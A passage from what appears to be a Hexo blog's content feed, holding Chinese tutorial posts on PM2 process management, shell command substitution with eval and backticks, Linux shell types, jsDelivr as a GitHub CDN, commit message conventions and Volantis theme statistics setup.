app_name&gt;</span><br></pre></td></tr></table></figure><p>实时监控所有进程CPU或内存使用情况：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pm2 monit</span><br></pre></td></tr></table></figure><h3 id="日志管理"><a href="#日志管理" class="headerlink" title="日志管理"></a>日志管理</h3><p>查看某个应用的日志：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pm2 logs [&#39;all&#39; | app_name | app_id ]</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ pm2 logs --json         # JSON 格式输出</span><br><span class="line">$ pm2 logs --format       # 格式化 output</span><br><span class="line">$ pm2 flush               # 清空所有日志文件</span><br><span class="line">$ pm2 reloadLogs          # 重新加载所有日志文件</span><br></pre></td></tr></table></figure><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><p>停止进程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pm2 stop [&#39;all&#39; | app_name | app_id ]</span><br></pre></td></tr></table></figure><p>重启进程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pm2 restart [&#39;all&#39; | app_name | app_id ]</span><br></pre></td></tr></table></figure><p>0秒停机重载进程 (用于 NETWORKED 进程)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pm2 reload all</span><br></pre></td></tr></table></figure><p>杀死进程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pm2 delete [&#39;all&#39; | app_name | app_id ]</span><br></pre></td></tr></table></figure><h3 id="使用PM2-运行-npm-start"><a href="#使用PM2-运行-npm-start" class="headerlink" title="使用PM2 运行 npm start"></a>使用PM2 运行 npm start</h3><p><code>npm run xxxx</code> 是 node常用的启动方式之一，那么如何使用<code>PM2</code>来实现对该方式的启动呢？</p><p><code>npm run</code>、<code>npm start</code>等命令之所以可以使用，是因为<code>package.json</code>配置文件中增加了对应的脚本命令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;scripts&quot;: &#123;</span><br><span class="line">    &quot;start-dev&quot;: &quot;env $(cat .env | xargs) nodemon server&#x2F;index&quot;,</span><br><span class="line">    &quot;start&quot;: &quot;node server&#x2F;index&quot;,</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>语法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pm2 start npm --watch --name &lt;taskname&gt; -- run &lt;scriptname&gt;;</span><br></pre></td></tr></table></figure><p>其中 <code>--watch</code>监听代码变化，<code>--name</code>重命名任务名称，<code>-- run</code>后面跟脚本名字</p><p>实例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 等效于 npm start</span><br><span class="line">pm2 start npm --watch --name webserver -- run start</span><br></pre></td></tr></table></figure><h3 id="稳定运行"><a href="#稳定运行" class="headerlink" title="稳定运行"></a>稳定运行</h3><p>PM2 是一款非常优秀的 Node 进程管理工具，它有着丰富的特性，能够充分利用多核CPU且能够负载均衡、能够帮助应用在崩溃后、指定时间(cluster model)和超出最大内存限制等情况下实现自动重启。</p><p>为了保证能够稳定运行，可以参考以下几点建议：</p><ol><li>应用进程运行时间久了或许总会产生一些意料之外的问题，定时重启可以规避一些不可测的情况；</li><li>最大内存限制，根据观察设定合理内存限制，保证应用异常运行；</li><li><code>min_uptime</code>，<code>min_uptime</code> 是应用正常启动的最小持续运行时长，合理设置设置此范围，可以将超出时间判定为异常启动；</li><li>设定异常重启延时restart_delay，对于异常情况导致应用停止，设定异常重启延迟可防止应用在不可测情况下不断重启的导致重启次数过多等问题；</li><li>设置异常重启次数，如果应用不断异常重启，并超过一定的限制次数，说明此时的环境长时间处于不可控状态，服务器异常。此时便可停止尝试，发出错误警告通知等。</li></ol><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://www.kancloud.cn/daiji/pm2/395273" target="_blank" rel="noopener">pm2 从入门到精通</a></li><li><a href="https://www.linuxidc.com/Linux/2019-07/159432.htm" target="_blank" rel="noopener">如何在生产服务器上安装PM2运行Node.js应用程序</a></li><li><a href="https://futurestud.io/tutorials/pm2-advanced-app-configuration-with-json-file" target="_blank" rel="noopener">PM2 配置文件说明解析</a></li><li><a href="https://pm2.keymetrics.io/docs/usage/application-declaration/" target="_blank" rel="noopener">PM2 应用配置文件解析</a></li><li><a href="https://fynn90.github.io/2018/01/11/PM2%E5%AE%9E%E7%94%A8%E6%89%8B%E5%86%8C/#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4" target="_blank" rel="noopener">PM2 实用手册</a></li><li><a href="https://www.cnblogs.com/cangqinglang/p/10676162.html" target="_blank" rel="noopener">PM2 用法详解</a></li><li><a href="https://juejin.im/post/5b823506e51d4538d517662f#heading-5" target="_blank" rel="noopener">使用pm2 自动部署node项目</a></li><li><a href="https://blog.windstone.cc/back-end/node/pm2.html#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4" target="_blank" rel="noopener">PM2 中文文档</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Node </category>
          
          <category> Tutorial </category>
          
          <category> 进程管理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tutorial </tag>
            
            <tag> Node </tag>
            
            <tag> PM2 </tag>
            
            <tag> 进程管理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 中的eval、反引号、$()的区别</title>
      <link href="/the-difference-between-eval-and-backquotes-in-linux-and/"/>
      <url>/the-difference-between-eval-and-backquotes-in-linux-and/</url>
      
        <content type="html"><![CDATA[<p>之前在搭建 SSH 环境时，遇到了这样一个问题：</p><blockquote><p>使用命令：<code>eval$(ssh-agent)</code>去创建一个代理进程，但是会提示：<code>No Such file or directory</code> 。</p></blockquote><p>就很纳闷，之前都用着好好的，为什么在新的环境中就不行了？</p><p>后来，了解到原来一直使用的 <code>eval$(ssh-agent)</code> ，其中的<code>$()</code> 原来在<code>Linux</code>中有特殊的意义。</p><p>所以这篇笔记专门用来了解 <code>eval</code> 和 <code>反引号</code> 以及 <code>$()</code>之间的区别。 它们的作用都是<strong>命令替换</strong>。</p><a id="more"></a><h2 id="场景重现"><a href="#场景重现" class="headerlink" title="场景重现"></a>场景重现</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ &#96;ssh-agent&#96;</span><br><span class="line">sh.exe&quot;: SSH_AUTH_SOCK&#x3D;&#x2F;tmp&#x2F;ssh-myYvgp1404&#x2F;agent.1404;: No such file or directory</span><br><span class="line"></span><br><span class="line">$ eval ssh-agent</span><br><span class="line">SSH_AUTH_SOCK&#x3D;&#x2F;tmp&#x2F;ssh-zIQZKN6080&#x2F;agent.6080; export SSH_AUTH_SOCK;</span><br><span class="line">SSH_AGENT_PID&#x3D;1092; export SSH_AGENT_PID;</span><br><span class="line">echo Agent pid 1092;</span><br><span class="line"></span><br><span class="line">$ eval &#96;ssh-agent&#96;</span><br><span class="line">Agent pid 4288</span><br></pre></td></tr></table></figure><p>直到我输入 eval <code>ssh-agent</code> 时，似乎就对了。</p><h3 id="命令代换"><a href="#命令代换" class="headerlink" title="命令代换"></a>命令代换</h3><p>这三种不同的方式都是<code>shell</code>脚本中的命令代换。</p><p>命令代换是指<code>shell</code>能够将一个命令的标准输出插在一个命令行中任何位置。</p><h4 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h4><p>首先要介绍的是: <code>eval</code></p><p>它的作用是：<strong>重新运算求出参数的内容</strong>。</p><p>该命令使用于那些一次扫描无法实现其功能的变量。该命令对变量进行两次扫描。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ touch test.txt</span><br><span class="line">$ vim test.txt      </span><br><span class="line">&#x2F;&#x2F; 写入 Hello eval</span><br><span class="line"></span><br><span class="line">$ var&#x3D;&quot;cat test.txt&quot;</span><br><span class="line">&#x2F;&#x2F; 注意：中间没有空格，前面没有美元符号。</span><br><span class="line"></span><br><span class="line">$ echo $var</span><br><span class="line">cat test.txt</span><br><span class="line">$ eval $var</span><br><span class="line">Hello eval</span><br></pre></td></tr></table></figure><h4 id="反引号与"><a href="#反引号与" class="headerlink" title="反引号与 $()"></a>反引号与 $()</h4><p>实例一：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ DATE1&#x3D;$(date)</span><br><span class="line">$ DATE2&#x3D;&#96;date&#96;</span><br><span class="line">$ DATE3&#x3D;&#96;eval date&#96;</span><br><span class="line"></span><br><span class="line">$ echo $DATE1</span><br><span class="line">2019年01月23日 21:20:36</span><br><span class="line">$ echo $DATE2</span><br><span class="line">2019年01月23日 21:20:36</span><br><span class="line">$ echo $DATE3</span><br><span class="line">2019年01月23日 21:20:36</span><br></pre></td></tr></table></figure><p>实例二：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ echo &#96;echo &#39;\\&#39;&#96; </span><br><span class="line">\</span><br><span class="line">$ echo $(echo &#39;\\&#39;)</span><br><span class="line">\\</span><br></pre></td></tr></table></figure><p>暂时没太明白这三者的实际应用场景，不过了解到了 它们之间的一些区别与联系。</p><h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><ul><li><a href="https://kyle.io/2012/09/ssh-agent-messiness-solving-it/" target="_blank" rel="noopener">https://kyle.io/2012/09/ssh-agent-messiness-solving-it/</a></li><li><a href="https://blog.csdn.net/Y1730008223CONG/article/details/74136055" target="_blank" rel="noopener">shell脚本中命令代换：反引号、$()、eval区别</a></li><li><a href="https://blog.csdn.net/if9600/article/details/74221548" target="_blank" rel="noopener">shell脚本中命令代换：反引号、$()、eval区别2</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 中的Shell 种类</title>
      <link href="/shell-types-in-linux/"/>
      <url>/shell-types-in-linux/</url>
      
        <content type="html"><![CDATA[<p>什么是Shell？</p><a id="more"></a><p>Shell 是一个程序，其作用是将用户输入的命令发送到OS（系统内核）。</p><p>据说它起源于作为存在于OS 内部和用户之间的外壳的依附着。所以为形象的称作为 壳（Shell）。</p><h2 id="Shell-的种类"><a href="#Shell-的种类" class="headerlink" title="Shell 的种类"></a>Shell 的种类</h2><p>Linux Shell 的种类很多，目前流行的Shell 包括ash、bash、ksh、csh、zsh等，种类多了，也就有了标准化的要求，这就是POSIX的由来。</p><p>POSIX 表示可移植操作系统接口（UNIX的可移植操作系统接口，缩写为POSIX），POSIX标准定义了操作系统应该为应用程序提供的接口标准。</p><p>通过以下命令来查看文件中的内容来查看自己主机中当前有哪些种类的Shell：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ cat &#x2F;etc&#x2F;shells</span><br><span class="line">&#x2F;bin&#x2F;sh</span><br><span class="line">&#x2F;bin&#x2F;bash</span><br><span class="line">&#x2F;bin&#x2F;ksh</span><br><span class="line">&#x2F;bin&#x2F;pdksh</span><br><span class="line">&#x2F;bin&#x2F;tcsh</span><br><span class="line">&#x2F;bin&#x2F;zsh</span><br><span class="line">&#x2F;bin&#x2F;dash</span><br><span class="line">&#x2F;bin&#x2F;posh</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;sh</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;bash</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;ksh</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;pdksh</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;tcsh</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;zsh</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;dash</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;posh</span><br></pre></td></tr></table></figure><p>如何查看当前正在使用的Shell 类型：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ echo $SHELL</span><br><span class="line">&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure><p><code>$SHELL</code>是一个环境变量，它记录了Linux 当前用户所使用的Shell类型。</p><p>用户可以通过直接输入各种Shell的二进制文件名（因为这些二进制文件本身是可以被执行的），来进入到该Shell下，比如进入<code>zsh</code>可以直接输入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ &#x2F;bin&#x2F;zsh</span><br></pre></td></tr></table></figure><p>这个命令为用户又启动了一个Shell，这个Shell在最初登录的那个Shell之后，称为下级的Shell或子Shell。</p><h2 id="最标准的Shell"><a href="#最标准的Shell" class="headerlink" title="最标准的Shell"></a>最标准的Shell</h2><h3 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h3><p><code>sh</code>是Unix 上最古老的Shell，在<code>sh</code>的基础上添加了各种扩展功能的是<code>bash</code>，它成为Linux标准Shell。有如下的特点：</p><ul><li>使用上下键快速查看历史命令</li><li>Tab 键自动补全</li></ul><h2 id="其他Shell"><a href="#其他Shell" class="headerlink" title="其他Shell"></a>其他Shell</h2><h3 id="ash"><a href="#ash" class="headerlink" title="ash"></a>ash</h3><p><code>ash</code>是Linux 中占用系统资源最少的一个小Shell，它只包含24个内部命令，因而使用起来很不方便。</p><h3 id="csh"><a href="#csh" class="headerlink" title="csh"></a>csh</h3><p><code>csh</code>是Linux 比较大的内核，共有52个内部命令。该Shell其实是指向/bin/tcsh这样的一个Shell，也就是说，csh其实就是tcsh。</p><h3 id="zsh"><a href="#zsh" class="headerlink" title="zsh"></a>zsh</h3><p>zch是Linux 最大的Shell之一，共有84 个内部命令。 zsh具有如下特性：</p><ul><li>更好的自动补全、更高效</li><li>更好的文件名展开（通配符展开）</li><li>可定制性高</li></ul><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://academy.gmocloud.com/keywords/20170324/4010" target="_blank" rel="noopener">什么是Shell以及常见Shell种类</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>免费 CDN：JsDelivr + Github</title>
      <link href="/free-cdn-jsdelivr-github/"/>
      <url>/free-cdn-jsdelivr-github/</url>
      
        <content type="html"><![CDATA[<p>不知道大家通常是如何访问图床的，我之前一直使用的方式是：<code>GitHub</code> 图床 + <code>raw.githubusercontent</code>。</p><p>图片相关的资源全部放在<code>GitHub</code>上，然后使用GitHub 提供的素材服务器<code>raw.githubusercontent</code>去访问。但是这种方式存在一个问题，那就是放在 Github 的资源在国内加载速度比较慢，如果网络稍微差一些，资源可能就会加载失败。</p><p>因此需要使用 CDN 来加速来优化资源加载速度。</p><a id="more"></a><h2 id="CDN-是什么"><a href="#CDN-是什么" class="headerlink" title="CDN 是什么"></a>CDN 是什么</h2><blockquote><p>CDN的全称是<code>Content Delivery Network</code>，即内容分发网络。CDN是构建在网络之上的内容分发网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。CDN的关键技术主要有内容存储和分发技术。——百度百科</p></blockquote><p>由于某些原因，很多公用免费的 CDN 资源在中国大陆并不很好用，就算是付费的，也有一定的限制，例如每天的刷新次数有限之类的。<br>幸运的是在中国大陆唯一有 license 的公有 CDN竟然是免费的，它就是——<a href="https://www.jsdelivr.com/" target="_blank" rel="noopener">JsDelivr</a>。</p><h2 id="JsDelivr-是什么"><a href="#JsDelivr-是什么" class="headerlink" title="JsDelivr 是什么"></a>JsDelivr 是什么</h2><blockquote><p>A free CDN for Open Source fast, reliable, and automated. —— JsDelivr 官网</p></blockquote><p>根据官网的介绍我们可以知道它是一个<strong>免费</strong>、<strong>快速</strong>、<strong>可靠</strong>、<strong>自动化</strong> 的CDN。</p><p>那么，这么棒的CDN，到底该如何使用呢？下面会一一介绍。</p><h2 id="快速上手"><a href="#快速上手" class="headerlink" title="快速上手"></a>快速上手</h2><p>JsDelivr 目前有三种用法：</p><ul><li>Npm</li><li>Github</li><li>Wordpress</li></ul><p>因为本文的重点是如何使用 GitHub + JsDelivr，来搭建免费的CDN，所以这里就不对其他两种用法做过多介绍。</p><h3 id="1-新建Github-仓库"><a href="#1-新建Github-仓库" class="headerlink" title="1. 新建Github 仓库"></a>1. 新建Github 仓库</h3><p>这个仓库是用于存储资源文件的，最好是public，因为private的仓库，资源链接会带token验证，而这个token会存在过期的问题。</p><h3 id="2-将本地资源推送至仓库"><a href="#2-将本地资源推送至仓库" class="headerlink" title="2. 将本地资源推送至仓库"></a>2. 将本地资源推送至仓库</h3><p>将资源文件加入本地仓库，然后推送至 CDN 的远程仓库。</p><h3 id="3-发布仓库"><a href="#3-发布仓库" class="headerlink" title="3. 发布仓库"></a>3. 发布仓库</h3><p>如果没有发布就直接使用，可能会导致文件加载异常。</p><p>自定义发布版本号：<br><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200710132805.png" alt=""></p><p>然后点击<code>Publish release</code>。</p><h3 id="4-通过jsDeliver引用资源"><a href="#4-通过jsDeliver引用资源" class="headerlink" title="4. 通过jsDeliver引用资源"></a>4. 通过jsDeliver引用资源</h3><p>只需要通过符合 JSDelivr 规则的 URL 引用，即可直接使用 Github 中的资源。</p><p>规则如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;username&#x2F;repository@version&#x2F;file</span><br></pre></td></tr></table></figure><p>参数说明：</p><ul><li><code>cdn.jsdelivr.net/gh/</code>：jsDeliver 规定Github 的引用地址</li><li><code>username</code>：你的GitHub 用户名</li><li><code>repository</code>：CDN 仓库</li><li><code>@version</code>：发布的版本号</li><li><code>file</code>：资源文件在仓库中的路径</li></ul><p>版本号不是必需的，是为了区分新旧资源，如果不使用版本号，将会直接引用最新资源，除此之外还可以使用某个范围内的版本，查看所有资源等，具体使用方法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 通过指定版本号引用</span><br><span class="line">https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;0xAiKang&#x2F;CDN&#x2F;blog&#x2F;images&#x2F;avatar.jpg</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 使用一个范围内的版本</span><br><span class="line">https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;jquery&#x2F;jquery@3.2.1&#x2F;dist&#x2F;jquery.min.js</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 忽略版本号则默认使用最新版</span><br><span class="line">https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;jquery&#x2F;jquery&#x2F;dist&#x2F;jquery.min.js</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 在任意JS&#x2F;CSS文件后添加 .min 能得到一个缩小版</span><br><span class="line">&#x2F;&#x2F; 如果它本身不存在，我们将会为你生成</span><br><span class="line">https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;jquery&#x2F;jquery@3.2.1&#x2F;src&#x2F;core.min.js</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 在末尾加 &#x2F; 则得到目录列表</span><br><span class="line">https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;jquery&#x2F;jquery&#x2F;</span><br></pre></td></tr></table></figure><p>同样的一张图片，可以对比一下<code>jsDeliver</code>和<code>raw.githubusercontent</code> 的访问速度。</p><ul><li><code>jsDeliver</code>：<a href="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/avatar.jpg" target="_blank" rel="noopener">https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/avatar.jpg</a></li><li><code>raw.githubusercontent</code>：<a href="https://raw.githubusercontent.com/0xAiKang/CDN/master/blog/images/avatar.jpg" target="_blank" rel="noopener">https://raw.githubusercontent.com/0xAiKang/CDN/master/blog/images/avatar.jpg</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Tutorial </category>
          
          <category> GitHub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tutorial </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何写好Commit log</title>
      <link href="/how-to-write-a-commit-log/"/>
      <url>/how-to-write-a-commit-log/</url>
      
        <content type="html"><![CDATA[<p>其实关于这个问题，老早都想整理了，只是一直没有腾出空来，最近刚好有空，索性整理了下。</p><p>这里就不过多介绍什么是<code>Git</code>了，本文的重点是<code>Commit Log</code>，如果还不清楚<code>Git</code>是什么，可以看一下我的<code>Git</code>系列的其他笔记。</p><h2 id="为什么要关注提交信息"><a href="#为什么要关注提交信息" class="headerlink" title="为什么要关注提交信息"></a>为什么要关注提交信息</h2><ol><li>加快<code>Reviewing Code</code>的过程</li><li>提醒自己或他人，某个提交具体增加了什么功能，改动了哪些地方</li><li>提高项目的整体质量</li></ol><h2 id="Angular-规范的-Commit-message-格式"><a href="#Angular-规范的-Commit-message-格式" class="headerlink" title="Angular 规范的 Commit message 格式"></a>Angular 规范的 Commit message 格式</h2><p>这种格式（规范）是我目前觉得相对其他格式（规范）而言，最容易接受、上手的一种。</p><p>其核心是每次提交，Commit message 都包括三个部分：Header，Body 和 Footer。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;type&gt;(&lt;scope&gt;): &lt;subject&gt;</span><br><span class="line">&#x2F;&#x2F; 空一行</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&#x2F;&#x2F; 空一行</span><br><span class="line">&lt;footer&gt;</span><br></pre></td></tr></table></figure><p>其中，Header 是必需的，Body 和 Footer 可以省略。</p><h3 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h3><p>Header 部分只有一行，包括三个字段：<strong>type</strong>（必需）、<strong>scope</strong>（可选）和 <strong>subject</strong>（必需）。</p><p><strong>type</strong> 用于说明 <code>commit</code> 的类别，只允许使用下面 7 个标识。</p><ul><li><strong>feat</strong> 新功能（feature）</li><li><strong>fix</strong> 修补 bug</li><li><strong>docs</strong> 文档（documentation）</li><li><strong>style</strong> 格式（不影响代码运行的变动）</li><li><strong>refactor</strong> 重构（即不是新增功能，也不是修改 bug 的代码变动）</li><li><strong>test</strong> 增加测试</li><li><strong>chore</strong> 构建过程、辅助工具的变动</li><li><strong>perf</strong> 提高性能</li><li><strong>typo</strong> 打字错误</li></ul><p><strong>scope</strong> 用于说明 <code>commit</code> 影响的范围，比如数据层、控制层、视图层等等，视项目不同而不同。</p><p><strong>subject</strong> 是 <code>commit</code> 目的的简短描述，不超过 50 个字符。</p><h3 id="Body"><a href="#Body" class="headerlink" title="Body"></a>Body</h3><p>Body 部分是对本次 commit 的详细描述，可以分成多行。</p><h3 id="Footer"><a href="#Footer" class="headerlink" title="Footer"></a>Footer</h3><p>Footer 部分只用于不兼容变动和关闭 Issue。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本来我自己一直使用的方式就是：<code>git commit -am &quot;fix login bug&quot;</code>，虽然并没有绝对的对错，但这显然不是最好的方式。</p><p>这种东西并没有强制性的规定，只要团队之间约定好，然后按照这个约定协作就好了。</p><p>所以我觉得在团队之间<code>commit</code>时，可以不用完全按照<code>Angular 规范的Commit message</code>格式去提交，可以按照以下约定来执行。</p><ul><li><code>commit</code>时，只用保留 Header 部分就好。</li><li><code>pull request</code>时，才需要 Header、Body、Footer 这三部分。</li></ul><p>另外<code>commit</code>时需要注意以下几点：</p><ul><li>创建短小而明确的<code>commit</code>，一句话说清楚。</li><li>一个小改动对应一次<code>commit</code>，不建议一大堆改动，一次<code>commit</code>。</li><li>如果添加的代码会使项目发生极大的变化，那么需要及时更新<code>remade</code>文件以向他人说明此次更改。</li></ul><h2 id="最佳实践"><a href="#最佳实践" class="headerlink" title="最佳实践"></a>最佳实践</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docs: add FAQ in readme file</span><br><span class="line">feat: increase user login function</span><br><span class="line">fix: fix user login bug</span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://ruby-china.org/topics/15737" target="_blank" rel="noopener">Git 如何写好 Commit Log？</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Git </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tutorial </tag>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo Volantis 主题优化 | 增加分析与统计</title>
      <link href="/hexo-volantis-theme-optimization-add-analysis-and-statistics/"/>
      <url>/hexo-volantis-theme-optimization-add-analysis-and-statistics/</url>
      
        <content type="html"><![CDATA[<p>Volantis 默认支持 <a href="http://busuanzi.ibruce.info/" target="_blank" rel="noopener">不蒜子</a> 的访问统计，可以自行添加<a href="https://tongji.baidu.com/" target="_blank" rel="noopener">百度统计</a>和 <a href="https://analytics.google.com/" target="_blank" rel="noopener">Google Analytics</a>。</p><a id="more"></a><h2 id="环境要求"><a href="#环境要求" class="headerlink" title="环境要求"></a>环境要求</h2><ul><li>Hexo：4.2</li><li>Node：12</li><li>Volantis：2.6</li></ul><h2 id="分析与统计"><a href="#分析与统计" class="headerlink" title="分析与统计"></a>分析与统计</h2><h3 id="字数和阅读时长"><a href="#字数和阅读时长" class="headerlink" title="字数和阅读时长"></a>字数和阅读时长</h3><ol><li>Volantis 默认没有安装 <code>wordcount</code>插件，所以需要手动安装：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i --save hexo-wordcount</span><br></pre></td></tr></table></figure><ol start="2"><li>修改主题配置文件<code>themes/volantis/_config.yml</code>，将 wordcount 插件打开</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">plugins:</span><br><span class="line">  ...</span><br><span class="line">  # 文章字数统计、阅读时长，开启需要安装插件: npm i --save hexo-wordcount</span><br><span class="line">  wordcount: true</span><br></pre></td></tr></table></figure><ol start="3"><li>继续修改主题配置文件<code>themes/volantis/_config.yml</code>，将 <code>wordcount</code> 放在需要显示的 meta 位置：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 布局</span><br><span class="line">layout:</span><br><span class="line">  on_list:</span><br><span class="line">    meta: [..., wordcount, ...]</span><br><span class="line">  on_page:</span><br><span class="line">    